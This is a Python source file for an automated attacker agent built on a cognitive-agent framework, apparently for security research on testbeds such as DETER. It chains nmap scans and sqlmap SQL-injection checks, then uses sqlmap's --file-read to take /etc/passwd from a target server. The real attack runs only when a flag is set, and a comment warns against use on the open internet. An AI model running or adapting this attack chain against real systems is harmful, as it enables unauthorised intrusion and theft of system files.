import sys; sys.path.extend(['../../'])
from Dash2.core.dash_agent import DASHAgent
from Dash2.core.system2 import isConstant
import subprocess
import argparse


class AttackAgent(DASHAgent):

    def __init__(self, args):

        self.SQLMapHome = args.sqlmap_home

        self.target_file = args.target_file
        self.agentDef = """
        
goalWeight readFile(hidden_computer, '{0}') 1

goalRequirements readFile(target, file)
  SQLVulnerability(target, port, baseUrl, parameter)
  reachable(attackLoc, target)
  SQLInjectionReadFile(attackLoc, target, file, port, baseUrl, parameter)

goalRequirements SQLVulnerability(host, port, baseUrl, parameter)
  likelyVulnerability(host, port, baseUrl, parameter)
  service(host, port, protocol)
  checkSQLVulnerability(host, port, baseUrl, parameter)
  httpStyle(protocol)

# To find a likely SQL vulnerability, check if it has an http service and then look at some pages
goalRequirements likelyVulnerability(target, port, baseUrl, parameter)
  reachable(attackLoc, target)
  service(target, port, 'http')
  likelyVulnCheckPage(target, port, baseUrl, parameter)

goalRequirements service(target, port, protocol)
  haveControl(source)
  portScanner(source, 'nmap', target, port, protocol)

# public hosts are reachable
goalRequirements reachable(source, target)
  public(target)

# Scan for reachable targets
goalRequirements reachable(source, target)
  haveControl(source)
  hostScanner(source, 'nmap', target)

# Short-cut the pivot step for now to make sure of the big piture
goalRequirements haveControl(source)
  gainControl(source)

# this predicate means the information is known, and also records
# that a subgoal has been achieved
known likelyVulnerability('{1}', _80, '{2}', _id)
known likelyVulnerability(_server3, _80, 'cards.php', _select)
known likelyVulnerability(_localhost, _80, 'index.html', _name)

known public('{1}')  # these hosts are reachable from any site on the internet
known public(_server3)
known haveControl(_localhost)  # attack can launch scans etc from these hosts

"""

        DASHAgent.__init__(self)

        # WARNING: Don't run this on the open internet! In particular 'server3' etc. are bound on my
        # home ISP by a DNS company used by Time Warner Cable, that I don't want to attack!
        # This variable should be 'False' if the attack is simulated, and should only be set to 'True'
        # on a testbed such as DETER.
        self.realAttack = args.real_attack

        self.register()

        # This says what values from portScanner are likely to be attackable through http/sql injection
        for protocol in ['http', 'http-alt', 'http-proxy', 'sun-answerbook']:
            self.known('httpStyle', ['_' + protocol])

        self.primitiveActions([('SQLInjectionReadFile', self.SQLInjectionReadFile),
                  ('checkSQLVulnerability', self.check_sql_vulnerability)])

        self.readAgent(self.agentDef.format(args.target_file, args.server_to_attack, args.base_url))

        # For now
        #self.traceGoals = True

    # Define primitive actions by specifying the bound variables in the input
    # and returning a list of tuples of the other variables.
    # Later could return an iterator for efficiency.
    # Currently since the function is passed into the performAction method,
    # there can only be one argument. Will fix.

    # This is simplified right now to get the big picture
    def gain_control(self, predicate_host):
        predicate, host = predicate_host
        return [{}]

    def host_scanner(self, params):
        (predicate, source, executable, target) = params
        print("Running host scan on {} with {}".format(source, executable))  # Assume target is a variable
        if not self.realAttack:
            if self.connected:  # simulate the attack via the hub
                status, result = self.sendAction("host_scanner", (executable, source))
                print("**host_scanner result is", status, result)
                if status == 'success':
                    return [{target: x} for x in result]
                else:
                    return []
            else:  # simulate the attack in the agent process
                return []
        else:  # Run the scanner really. NYI but see port_scanner below
            return []

    # 'action' is a term, e.g. ('portScanner', '_server1', _80, 'protocol')
    def port_scanner(self, params):
        # Will expand to a call to nmap here
        (goal, host, executable, target, portVar, protocolVar) = params
        print("called portScanner on", host, target, portVar, protocolVar)
        # Target needs to be bound
        if not isConstant(target):
            print("Host needs to be bound on calling portScanner:", target)
            return False
        if not self.realAttack:
            if self.connected:
                status, scan_results = self.sendAction("port_scanner", (executable, host, target))
                print('scan_results:', scan_results)
                if status == 'success':
                    return [{portVar: "_" + str(port), protocolVar: "_" + scan_results[port]} for port in scan_results]
                else:
                    return []
            else:
                print("**Simulating port scan with", executable[1:], "returning http on port 80")
                return [{portVar: "_80", protocolVar: '_http'}]  # simulate a web server
        proc = None
        try:
            b = target[1:].encode('utf-8')
            output = subprocess.check_output([executable[1:], b]).decode('utf-8')
            proc = output.split('\n') # runs nmap if it's in the path
                
        except BaseException as e:
            print("Unable to run ", executable[1:], e)
            return []
        bindings_list = []
        reading_ports = False
        for line in proc:
            words = line.split()
            if not reading_ports and len(words) > 0 and words[0] == "PORT":
                reading_ports = True
            elif reading_ports and len(words) >= 3 and words[1] != 'done:':
                # each line like this is a port and protocol,
                # which may not match what we're looking for based on input bindings
                port = "_" + words[0][0:words[0].find("/")]  # remove '/tcp'
                protocol = "_" + words[2]
                # This returns all the results that match.
                # Also records every result just so nmap isn't run more than
                # necessary if a different port or protocol is explored later.
                self.knownTuple((goal, target, port, protocol))
                if not isConstant(portVar) and not isConstant(protocolVar):
                    bindings_list.append({portVar: port, protocolVar: protocol})
                elif portVar == port and not isConstant(protocolVar):
                    bindings_list.append({protocolVar: protocol})
                elif not isConstant(portVar) and protocolVar == protocol:
                    bindings_list.append({portVar: port})
                elif portVar == port and protocolVar == protocol:
                    bindings_list.append({})   # constants all match, record success
        print("port scanner", executable, ":", bindings_list)
        return bindings_list

    # Check out a page to find a likely SQL vulnerability. Right now faked here. Expect
    # target and port to be bound, supply base_url and parameter if it works.
    # They will be passed to something like check_sql_vulnerability below.
    def likely_vuln_check_page(self, params):
        (predicate, target, port, base_url, parameter) = params
        print("Looking for potential sql injection vulnerability on", target, port)
        return [{base_url: 'cards.php', parameter: '_select'}]

    def check_sql_vulnerability(self, action):
        print("Checking sql vulnerability with action", action)
        # Expect everything to be bound and use sqlmap to check there is a vulnerability there
        # Remove the prefix underscores
        [host, port, base, parameter] = [arg[1:] for arg in action[1:]]
        if not self.realAttack:
            if self.connected:
                status = self.sendAction("check_sql_vulnerability", (host, port, base, parameter))
                return [{}] if status == 'success' else []
            else:
                print("** Simulating sql map finding a vulnerability on", host)
                return [{}]    # no bindings, just report finding a vulnerability
        proc = None
        call = ["python", self.SQLMapHome + "/sqlmap.py", "--batch", "-u", "http://" + host + ":" + port + "/" + base + "?" + parameter + "=1"]
        try:
            proc = subprocess.Popen(call, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        except BaseException as e:
            print("Unable to run sqlmap:", e)
            return []
        result = []
        printing = False
        seen_dashes = 0  # follow the same algorithm for printing as the original java version
        # also following the same approach to writing
        line = ""
        while True:
            out = proc.stdout.read(1).decode('utf-8')
            if out == '' and proc.poll() != None:
                break
            if out != '':
                #sys.stdout.write(out)
                #sys.stdout.flush()
                if  out == '\n':
                    if "the following injection point" in line:    # found at least one injection point
                        result = [{}]    # This would signify success without adding new bindings
                        printing = True
                    if printing:
                        print(("SQLMap: " + line))
                    if "---" in line:
                        seen_dashes += 1
                        if seen_dashes == 2:
                            printing = False
                    if "o you want to" in line:  # I suspect these lines are actually sent to stderr - they don't seem
                        # to show up here.
                        print("SQLMap (answering):", line)
                    if "starting" or "shutting down" in line:
                        print("SQLMap:", line)
                    if "shutting down" in line:
                        line = ""
                    line = ""
                else:
                    line += out
        print("Finished sqlmap")
        print(proc.communicate())
        return result

    def SQLInjectionReadFile(self, args):
        print("Performing sql injection attack to read a file with args", args)
        [source, target, targetFile, port, baseUrl, parameter] = [arg[1:] for arg in args[1:]]  # assume constants, remove _
        # Call is very similar to sqlMap above with an extra --file-read argument
        if not self.realAttack:
            if self.connected:
                status, file_contents = self.sendAction("sql_injection_read_file",
                                                        (target, targetFile, port, baseUrl, parameter))
                print('status:', status, file_contents)
                return [{}] if status == 'success' else []
            else:
                print("** simulating sql injection attack success for ", target, targetFile, port, baseUrl, parameter)
                return [{}]  # simulate success in reading the file (it is stored locally by sqlmap in the real attack)
        result = []
        try:
            call = ["python", self.SQLMapHome + "/sqlmap.py", "--batch", "-u", "http://" + target + ":" + port + "/" + baseUrl + "?" + parameter + "=1", "--file-read="+ targetFile]
            proc = subprocess.Popen(call, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            # The java sends three carriage returns - here I look for lines asking questions and send them
            # On second thoughts, no
            line = ""
            while True:
                out = proc.stdout.read(1).decode('utf-8')
                if out == '' and proc.poll() != None:
                    break
                if out != '':
                    if  out == '\n':
                        #print("SQLMap read:", line)
                        if 'o you want to' in line:
                            print("Sending default answer:", line)
                            proc.stdin.write('\n')
                        if "the local file" in line:
                            result = [{}]  # Remote file was stored to a local file. Mark success of the action.
                        line = ""
                    else:
                        line += out
                    sys.stdout.write(out)
                    sys.stdout.flush()

        except BaseException as e:
            print("Unable to run sqlmap to read file:", e)
        return result


def get_args():
    parser = argparse.ArgumentParser(description='Create attacker config.')
    parser.add_argument(
        '--real-attack', dest='real_attack', default=False,
        action='store_const', const=True, help='Set if is a real attack or not'
    )
    parser.add_argument(
        '--sqlmap-home', type=str, dest='sqlmap_home',
        default='/users/blythe/attack/sqlmap',
        help='Set sqlmap home directory'
    )
    parser.add_argument(
        '--server-to-attack', type=str, dest='server_to_attack',
        default='server1',
        help='Set which server to attack'
    )
    parser.add_argument(
        '--target-file', type=str, dest='target_file',
        default='/etc/passwd',
        help='Set target file to read'
    )
    parser.add_argument(
        '--base-url', type=str, dest='base_url',
        default='cards.php',
        help='Set base url where to try the SQL injection'
    )

    return parser.parse_args()

if __name__ == "__main__":
    args = get_args()
    AttackAgent(args).agent_loop(max_iterations=10)   # enough iterations for the first attack
    
